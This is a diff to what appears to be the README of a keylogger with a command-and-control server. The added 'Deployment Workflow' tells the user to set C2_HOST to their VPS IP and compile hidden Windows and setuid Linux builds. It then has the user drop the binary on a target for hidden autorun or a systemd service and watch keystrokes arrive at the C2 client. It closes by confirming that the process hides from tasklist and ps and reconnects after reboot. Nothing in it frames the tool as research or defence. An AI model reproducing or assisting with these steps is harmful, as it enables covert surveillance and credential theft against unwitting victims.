@@ -35,7 +35,23 @@ sc start KeyboardService
 compilation
 gcc -mwindows -lws2_32 -o server.exe client.c
 
+Deployment Workflow
+Change C2_HOST in both server files to your VPS IP
+Compile:
 
+Windows: gcc -mwindows -lws2_32 -o server.exe server_win.c
+Linux:   gcc -o server server_linux.c -pthread && sudo chmod +s server
+
+Deploy:
+
+Windows: Drop server.exe → Runs hidden + autorun
+Linux:   Drop server → sudo systemctl start keyboard
+
+C2: ./client → "Target connected" → Type on target → Keys appear
+
+Windows: tasklist | findstr server   → Nothing
+Linux:   ps aux | grep server       → PID 1 child only
+Both:    Reboot → Auto-reconnects
 
 
 
